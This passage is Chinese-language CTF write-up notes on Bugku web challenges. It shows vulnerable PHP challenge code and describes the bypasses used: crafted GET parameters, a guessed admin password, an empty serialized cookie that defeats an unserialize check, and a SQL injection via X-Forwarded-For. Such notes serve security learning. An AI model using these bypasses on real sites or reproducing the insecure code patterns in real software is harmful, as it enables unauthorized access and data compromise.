	
	%22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E
	
	";if(!$_GET['id']) {
		header('Location: hello.php?id=1');
		exit();
	}
	$id=$_GET['id'];
	$a=$_GET['a'];
	$b=$_GET['b'];
	if(stripos($a,'.'))	{
		echo 'no no no no no no no';
		return ;
	}
	$data = @file_get_contents($a,'r');
	if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
		require("f4l2a3g.txt");
	else
		print "never never never give up !!!";
	?>
	既然是 require(f4l2a3g.txt) 直接看看这个文件？flag就直接能看到了

	
# 细心
	出现一个假的404页面，源代码里面也啥都没有，尝试扫扫后台，发现robots.txt
	打开它，发现一个 resusl.php 文件，再进去看一下，提示 _GET['x'] == password
	提交 x = admin ，结果真中了，如果还没出来，只能想办法爆破了
	
	
# flag.php
	有个登录框，点 login 没反应，题名叫 flag.php，肯定有这个文件，进去看一下
	啥都没有。上面提交之所以没反应，是因为 action=#，之前猜测直接给flag.php post 
	user & password 的值，还是没卵用，试试post hint?，还是没用，最终看别人的解释是
	在flagphp处get hint=1，直接出源码了？？还是要多尝试，反正就这么多套路
	
	 <?php
		error_reporting(0);
		include_once("flag.php");
		$cookie = $_COOKIE['ISecer'];
		if(isset($_GET['hint']))
			show_source(__FILE__);
		elseif (unserialize($cookie) === "$KEY") 
			echo "$flag";
		else {
			?>
			<html>
			<head>
			<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
			<title>Login</title>
			<link rel="stylesheet" href="admin.css" type="text/css">
			</head>
			<body>
			<br>
			<div class="container" align="center">
			  <form method="POST" action="#">
				<p><input name="user" type="text" placeholder="Username"></p>
				<p><input name="password" type="password" placeholder="Password"></p>
				<p><input value="Login" type="button"/></p>
			  </form>
			</div>
			</body>
			</html>

		<?php
		}
			$KEY='ISecer:www.isecer.com';
		?> 
		
	打算直接提交ISecer = $KEY 的反序列化，后面发现在此之前$KEY都没有被定义，所以KEY是空的，
	只需提交空的序列化上去就可以了
		<?php
			$cookie = serialize("$key");
			print_r($cookie);
		?>
	这样构造一下，就得到了 s:0:"";
	但是注意;(分号)在cookie中不会被正确的上传到服务器，构造URL编码
	;的URL编码为%3B
	所以 cookie:ISecer=s:0:""%3B
	
	
# INSERT INTO注入
	error_reporting(0);

	function getIp(){
		$ip = '';
		if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}else{
			$ip = $_SERVER['REMOTE_ADDR'];
		}
		$ip_arr = explode(',', $ip);
		return $ip_arr[0];
	}

	$host="localhost";
	$user="";
	$pass="";
	$db="";

	$connect = mysql_connect($host, $user, $pass) or die("Unable to connect");

	mysql_select_db($db) or die("Unable to select database");

	$ip = getIp();
	echo 'your ip is :'.$ip;
	$sql="insert into client_ip (ip) values ('$ip')";
	mysql_query($sql);